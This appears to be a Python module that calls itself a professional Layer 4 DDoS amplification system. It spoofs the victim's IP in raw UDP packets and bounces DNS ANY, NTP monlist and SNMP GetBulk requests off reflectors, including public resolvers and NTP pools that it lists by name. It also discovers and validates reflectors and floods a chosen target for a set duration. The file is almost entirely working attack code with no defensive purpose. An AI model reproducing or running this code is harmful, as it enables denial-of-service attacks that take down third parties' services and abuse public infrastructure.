"""
Amplification Attack System
Professional amplification techniques for Layer 4 DDoS attacks
"""

import socket
import struct
import random
import time
import threading
from typing import Dict, List, Optional, Tuple, Set, Any
from dataclasses import dataclass, field
from abc import ABC, abstractmethod
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.utils import NetworkUtils, CryptoUtils
from core.logger import logger


@dataclass
class AmplificationConfig:
    """Configuration for amplification attacks"""
    # General settings
    max_threads: int = 50
    timeout: int = 5
    retry_attempts: int = 3
    
    # Amplification factors (target ratios)
    min_amplification_factor: float = 2.0
    preferred_amplification_factor: float = 10.0
    
    # Protocol settings
    dns_enabled: bool = True
    ntp_enabled: bool = True
    snmp_enabled: bool = True
    ssdp_enabled: bool = True
    chargen_enabled: bool = True
    memcached_enabled: bool = True
    
    # Reflector management
    max_reflectors_per_protocol: int = 1000
    reflector_validation: bool = True
    reflector_rotation: bool = True
    rotation_interval: int = 300  # seconds
    
    # Rate limiting
    packets_per_second: int = 1000
    burst_size: int = 100
    burst_interval: float = 0.1
    
    # Evasion
    randomize_payloads: bool = True
    use_fragmentation: bool = False
    spoof_source_ports: bool = True


@dataclass
class ReflectorInfo:
    """Information about amplification reflector"""
    ip: str
    port: int
    protocol: str
    amplification_factor: float = 0.0
    response_time: float = 0.0
    success_rate: float = 0.0
    last_tested: float = 0.0
    is_active: bool = True
    failure_count: int = 0


class AmplificationProtocol(ABC):
    """Abstract base class for amplification protocols"""
    
    def __init__(self, config: AmplificationConfig):
        self.config = config
        self.reflectors: List[ReflectorInfo] = []
        self.protocol_name = ""
        self.default_port = 0
        
    @abstractmethod
    def create_payload(self, target_ip: str) -> bytes:
        """Create amplification payload"""
        pass
    
    @abstractmethod
    def get_default_reflectors(self) -> List[str]:
        """Get list of default reflector IPs"""
        pass
    
    @abstractmethod
    def validate_reflector(self, reflector_ip: str) -> Tuple[bool, float]:
        """Validate reflector and return (is_valid, amplification_factor)"""
        pass
    
    def discover_reflectors(self, ip_ranges: List[str] = None) -> int:
        """Discover new reflectors"""
        logger.info(f"Discovering {self.protocol_name} reflectors...")
        
        if not ip_ranges:
            # Use default reflectors
            default_ips = self.get_default_reflectors()
            for ip in default_ips:
                reflector = ReflectorInfo(
                    ip=ip,
                    port=self.default_port,
                    protocol=self.protocol_name
                )
                self.reflectors.append(reflector)
        else:
            # Scan IP ranges
            self._scan_ip_ranges(ip_ranges)
        
        # Validate reflectors
        if self.config.reflector_validation:
            self._validate_reflectors()
        
        active_count = len([r for r in self.reflectors if r.is_active])
        logger.info(f"Found {active_count} active {self.protocol_name} reflectors")
        
        return active_count
    
    def _scan_ip_ranges(self, ip_ranges: List[str]):
        """Scan IP ranges for reflectors"""
        # Implementation would scan networks for open services
        # This is a simplified version
        pass
    
    def _validate_reflectors(self):
        """Validate all reflectors"""
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = []
            
            for reflector in self.reflectors:
                future = executor.submit(self._test_reflector, reflector)
                futures.append(future)
            
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.debug(f"Reflector validation error: {e}")
    
    def _test_reflector(self, reflector: ReflectorInfo):
        """Test individual reflector"""
        try:
            is_valid, amp_factor = self.validate_reflector(reflector.ip)
            reflector.is_active = is_valid
            reflector.amplification_factor = amp_factor
            reflector.last_tested = time.time()
            
            if not is_valid:
                reflector.failure_count += 1
                
        except Exception as e:
            reflector.is_active = False
            reflector.failure_count += 1
            logger.debug(f"Reflector test failed for {reflector.ip}: {e}")
    
    def get_active_reflectors(self, count: Optional[int] = None) -> List[ReflectorInfo]:
        """Get active reflectors"""
        active = [r for r in self.reflectors if r.is_active]
        
        if count:
            return random.sample(active, min(count, len(active)))
        
        return active
    
    def send_amplification_packet(self, reflector: ReflectorInfo, target_ip: str, source_port: int = None):
        """Send amplification packet through reflector"""
        try:
            payload = self.create_payload(target_ip)
            
            # Create raw socket for spoofing
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Build IP header
            ip_header = self._build_ip_header(target_ip, reflector.ip, len(payload) + 8)
            
            # Build UDP header
            src_port = source_port or random.randint(32768, 65535)
            udp_header = self._build_udp_header(src_port, reflector.port, len(payload))
            
            # Send packet
            packet = ip_header + udp_header + payload
            sock.sendto(packet, (reflector.ip, reflector.port))
            sock.close()
            
        except Exception as e:
            logger.debug(f"Failed to send amplification packet: {e}")
    
    def _build_ip_header(self, src_ip: str, dst_ip: str, total_length: int) -> bytes:
        """Build IP header for spoofed packet"""
        version_ihl = (4 << 4) + 5  # IPv4, header length 5*4=20 bytes
        tos = 0
        total_len = total_length + 20  # IP header + UDP header + payload
        identification = random.randint(0, 65535)
        flags_fragment = 0
        ttl = random.randint(64, 128)
        protocol = socket.IPPROTO_UDP
        checksum = 0  # Will be calculated by kernel
        
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        
        return struct.pack('!BBHHHBBH4s4s',
                          version_ihl, tos, total_len, identification,
                          flags_fragment, ttl, protocol, checksum,
                          src_addr, dst_addr)
    
    def _build_udp_header(self, src_port: int, dst_port: int, data_length: int) -> bytes:
        """Build UDP header"""
        length = 8 + data_length
        checksum = 0  # Simplified - normally would calculate
        
        return struct.pack('!HHHH', src_port, dst_port, length, checksum)


class DNSAmplification(AmplificationProtocol):
    """DNS amplification attack"""
    
    def __init__(self, config: AmplificationConfig):
        super().__init__(config)
        self.protocol_name = "DNS"
        self.default_port = 53
        
        # DNS query types for maximum amplification
        self.query_types = [
            ('ANY', 255),    # ANY query - highest amplification
            ('TXT', 16),     # TXT records
            ('MX', 15),      # Mail exchange
            ('NS', 2),       # Name server
            ('SOA', 6),      # Start of authority
            ('AAAA', 28),    # IPv6 address
        ]
        
        # Domains known to have large responses
        self.amplification_domains = [
            'isc.org',
            'ripe.net',
            'google.com',
            'cloudflare.com',
            'akamai.com',
            'amazon.com'
        ]
    
    def create_payload(self, target_ip: str) -> bytes:
        """Create DNS query payload"""
        # DNS header
        transaction_id = random.randint(0, 65535)
        flags = 0x0100  # Standard query, recursion desired
        questions = 1
        answer_rrs = 0
        authority_rrs = 0
        additional_rrs = 0
        
        header = struct.pack('!HHHHHH',
                           transaction_id, flags, questions,
                           answer_rrs, authority_rrs, additional_rrs)
        
        # DNS question
        domain = random.choice(self.amplification_domains)
        query_type_name, query_type = random.choice(self.query_types)
        query_class = 1  # IN (Internet)
        
        # Encode domain name
        domain_parts = domain.split('.')
        question = b''
        for part in domain_parts:
            question += bytes([len(part)]) + part.encode()
        question += b'\x00'  # End of domain name
        
        question += struct.pack('!HH', query_type, query_class)
        
        return header + question
    
    def get_default_reflectors(self) -> List[str]:
        """Get default DNS reflectors"""
        return [
            '8.8.8.8',      # Google DNS
            '8.8.4.4',      # Google DNS
            '1.1.1.1',      # Cloudflare DNS
            '1.0.0.1',      # Cloudflare DNS
            '208.67.222.222',  # OpenDNS
            '208.67.220.220',  # OpenDNS
            '9.9.9.9',      # Quad9
            '149.112.112.112',  # Quad9
        ]
    
    def validate_reflector(self, reflector_ip: str) -> Tuple[bool, float]:
        """Validate DNS reflector"""
        try:
            # Send test query
            test_payload = self.create_payload('127.0.0.1')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.config.timeout)
            
            start_time = time.time()
            sock.sendto(test_payload, (reflector_ip, 53))
            
            response, _ = sock.recvfrom(4096)
            response_time = time.time() - start_time
            
            sock.close()
            
            # Calculate amplification factor
            amplification_factor = len(response) / len(test_payload)
            
            return amplification_factor >= self.config.min_amplification_factor, amplification_factor
            
        except Exception:
            return False, 0.0


class NTPAmplification(AmplificationProtocol):
    """NTP amplification attack"""
    
    def __init__(self, config: AmplificationConfig):
        super().__init__(config)
        self.protocol_name = "NTP"
        self.default_port = 123
    
    def create_payload(self, target_ip: str) -> bytes:
        """Create NTP monlist payload"""
        # NTP packet for monlist command (mode 7, private)
        # This command returns list of recent clients (high amplification)
        
        li_vn_mode = 0x17  # LI=0, VN=2, Mode=7 (private)
        r_e_m_op = 0x2A    # R=0, E=0, M=1, OP=42 (monlist)
        sequence = random.randint(0, 255)
        implementation = 0x03  # XNTPD
        request_code = 42  # MON_GETLIST_1
        err_nitems = 0
        mbz_itemsize = 0x0800  # Item size
        
        payload = struct.pack('!BBBBBBH',
                            li_vn_mode, r_e_m_op, sequence, implementation,
                            request_code, err_nitems, mbz_itemsize)
        
        # Add padding to reach minimum size
        payload += b'\x00' * (48 - len(payload))
        
        return payload
    
    def get_default_reflectors(self) -> List[str]:
        """Get default NTP reflectors"""
        return [
            'pool.ntp.org',
            '0.pool.ntp.org',
            '1.pool.ntp.org',
            '2.pool.ntp.org',
            '3.pool.ntp.org',
            'time.nist.gov',
            'time.google.com',
            'time.cloudflare.com'
        ]
    
    def validate_reflector(self, reflector_ip: str) -> Tuple[bool, float]:
        """Validate NTP reflector"""
        try:
            test_payload = self.create_payload('127.0.0.1')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.config.timeout)
            
            sock.sendto(test_payload, (reflector_ip, 123))
            response, _ = sock.recvfrom(4096)
            
            sock.close()
            
            amplification_factor = len(response) / len(test_payload)
            return amplification_factor >= self.config.min_amplification_factor, amplification_factor
            
        except Exception:
            return False, 0.0


class SNMPAmplification(AmplificationProtocol):
    """SNMP amplification attack"""
    
    def __init__(self, config: AmplificationConfig):
        super().__init__(config)
        self.protocol_name = "SNMP"
        self.default_port = 161
        
        # SNMP OIDs that return large responses
        self.amplification_oids = [
            '1.3.6.1.2.1.1.1.0',      # sysDescr
            '1.3.6.1.2.1.2.2.1.2',    # ifDescr table
            '1.3.6.1.2.1.4.20.1.1',   # ipAddrTable
            '1.3.6.1.2.1.6.13.1.1',   # tcpConnTable
            '1.3.6.1.2.1.25.2.3.1.3', # hrStorageDescr
        ]
    
    def create_payload(self, target_ip: str) -> bytes:
        """Create SNMP GetBulkRequest payload"""
        # Simplified SNMP packet construction
        # In practice, would use proper ASN.1 encoding
        
        # SNMP v2c GetBulkRequest
        version = b'\x02\x01\x01'  # Version 2c
        community = b'\x04\x06public'  # Community string "public"
        
        # GetBulkRequest PDU
        pdu_type = b'\xa5'  # GetBulkRequest
        request_id = struct.pack('!I', random.randint(0, 2**32-1))
        non_repeaters = b'\x02\x01\x00'  # 0 non-repeaters
        max_repetitions = b'\x02\x01\x7f'  # 127 max repetitions
        
        # Variable bindings (OID)
        oid = random.choice(self.amplification_oids)
        oid_bytes = self._encode_oid(oid)
        
        varbind = b'\x30' + bytes([len(oid_bytes) + 2]) + oid_bytes + b'\x05\x00'
        varbind_list = b'\x30' + bytes([len(varbind)]) + varbind
        
        pdu_content = request_id + non_repeaters + max_repetitions + varbind_list
        pdu = pdu_type + bytes([len(pdu_content)]) + pdu_content
        
        message = version + community + pdu
        return b'\x30' + bytes([len(message)]) + message
    
    def _encode_oid(self, oid_str: str) -> bytes:
        """Encode OID string to bytes"""
        # Simplified OID encoding
        parts = [int(x) for x in oid_str.split('.')]
        encoded = b'\x06' + bytes([len(parts)]) + bytes(parts)
        return encoded
    
    def get_default_reflectors(self) -> List[str]:
        """Get default SNMP reflectors"""
        # These would be discovered through scanning
        return []
    
    def validate_reflector(self, reflector_ip: str) -> Tuple[bool, float]:
        """Validate SNMP reflector"""
        try:
            test_payload = self.create_payload('127.0.0.1')
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.config.timeout)
            
            sock.sendto(test_payload, (reflector_ip, 161))
            response, _ = sock.recvfrom(4096)
            
            sock.close()
            
            amplification_factor = len(response) / len(test_payload)
            return amplification_factor >= self.config.min_amplification_factor, amplification_factor
            
        except Exception:
            return False, 0.0


class AmplificationManager:
    """Main manager for amplification attacks"""
    
    def __init__(self, config: AmplificationConfig = None):
        self.config = config or AmplificationConfig()
        self.protocols: Dict[str, AmplificationProtocol] = {}
        
        # Initialize protocols
        if self.config.dns_enabled:
            self.protocols['DNS'] = DNSAmplification(self.config)
        
        if self.config.ntp_enabled:
            self.protocols['NTP'] = NTPAmplification(self.config)
        
        if self.config.snmp_enabled:
            self.protocols['SNMP'] = SNMPAmplification(self.config)
        
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_amplified': 0,
            'reflectors_used': set(),
            'protocols_used': set()
        }
    
    def discover_all_reflectors(self) -> Dict[str, int]:
        """Discover reflectors for all protocols"""
        results = {}
        
        with ThreadPoolExecutor(max_workers=len(self.protocols)) as executor:
            futures = {}
            
            for protocol_name, protocol in self.protocols.items():
                future = executor.submit(protocol.discover_reflectors)
                futures[future] = protocol_name
            
            for future in as_completed(futures):
                protocol_name = futures[future]
                try:
                    count = future.result()
                    results[protocol_name] = count
                except Exception as e:
                    logger.error(f"Failed to discover {protocol_name} reflectors: {e}")
                    results[protocol_name] = 0
        
        return results
    
    def launch_amplification_attack(self, target_ip: str, duration: int, 
                                  protocols: List[str] = None) -> Dict[str, Any]:
        """Launch coordinated amplification attack"""
        if not protocols:
            protocols = list(self.protocols.keys())
        
        logger.info(f"Launching amplification attack against {target_ip}")
        logger.info(f"Duration: {duration}s, Protocols: {protocols}")
        
        # Reset stats
        self.attack_stats = {
            'packets_sent': 0,
            'bytes_amplified': 0,
            'reflectors_used': set(),
            'protocols_used': set()
        }
        
        start_time = time.time()
        end_time = start_time + duration
        
        with ThreadPoolExecutor(max_workers=len(protocols)) as executor:
            futures = []
            
            for protocol_name in protocols:
                if protocol_name in self.protocols:
                    future = executor.submit(
                        self._run_protocol_attack,
                        protocol_name, target_ip, end_time
                    )
                    futures.append(future)
            
            # Wait for all attacks to complete
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    logger.error(f"Protocol attack failed: {e}")
        
        # Calculate final stats
        actual_duration = time.time() - start_time
        
        return {
            'duration': actual_duration,
            'packets_sent': self.attack_stats['packets_sent'],
            'bytes_amplified': self.attack_stats['bytes_amplified'],
            'reflectors_used': len(self.attack_stats['reflectors_used']),
            'protocols_used': list(self.attack_stats['protocols_used']),
            'average_pps': self.attack_stats['packets_sent'] / actual_duration,
            'amplification_ratio': (
                self.attack_stats['bytes_amplified'] / 
                max(1, self.attack_stats['packets_sent'] * 64)  # Assume 64 byte avg request
            )
        }
    
    def _run_protocol_attack(self, protocol_name: str, target_ip: str, end_time: float):
        """Run attack for specific protocol"""
        protocol = self.protocols[protocol_name]
        reflectors = protocol.get_active_reflectors()
        
        if not reflectors:
            logger.warning(f"No active reflectors for {protocol_name}")
            return
        
        logger.info(f"Starting {protocol_name} amplification with {len(reflectors)} reflectors")
        
        packet_count = 0
        last_burst_time = time.time()
        
        while time.time() < end_time:
            current_time = time.time()
            
            # Rate limiting
            if (current_time - last_burst_time) >= self.config.burst_interval:
                # Send burst of packets
                for _ in range(min(self.config.burst_size, len(reflectors))):
                    if time.time() >= end_time:
                        break
                    
                    reflector = random.choice(reflectors)
                    
                    try:
                        protocol.send_amplification_packet(reflector, target_ip)
                        
                        # Update stats
                        packet_count += 1
                        self.attack_stats['packets_sent'] += 1
                        self.attack_stats['bytes_amplified'] += int(
                            64 * reflector.amplification_factor
                        )
                        self.attack_stats['reflectors_used'].add(reflector.ip)
                        self.attack_stats['protocols_used'].add(protocol_name)
                        
                    except Exception as e:
                        logger.debug(f"Failed to send packet via {reflector.ip}: {e}")
                
                last_burst_time = current_time
            
            # Small delay to prevent overwhelming
            time.sleep(0.001)
        
        logger.info(f"{protocol_name} attack completed. Packets sent: {packet_count}")
    
    def get_best_reflectors(self, protocol: str, count: int = 10) -> List[ReflectorInfo]:
        """Get best reflectors for protocol"""
        if protocol not in self.protocols:
            return []
        
        reflectors = self.protocols[protocol].get_active_reflectors()
        
        # Sort by amplification factor and success rate
        reflectors.sort(
            key=lambda r: (r.amplification_factor * r.success_rate),
            reverse=True
        )
        
        return reflectors[:count]
    
    def get_amplification_stats(self) -> Dict[str, Any]:
        """Get comprehensive amplification statistics"""
        stats = {
            'protocols': {},
            'total_reflectors': 0,
            'attack_stats': self.attack_stats.copy()
        }
        
        for protocol_name, protocol in self.protocols.items():
            active_reflectors = protocol.get_active_reflectors()
            
            stats['protocols'][protocol_name] = {
                'active_reflectors': len(active_reflectors),
                'total_reflectors': len(protocol.reflectors),
                'avg_amplification_factor': sum(
                    r.amplification_factor for r in active_reflectors
                ) / max(1, len(active_reflectors)),
                'best_amplification_factor': max(
                    (r.amplification_factor for r in active_reflectors),
                    default=0
                )
            }
            
            stats['total_reflectors'] += len(active_reflectors)
        
        return stats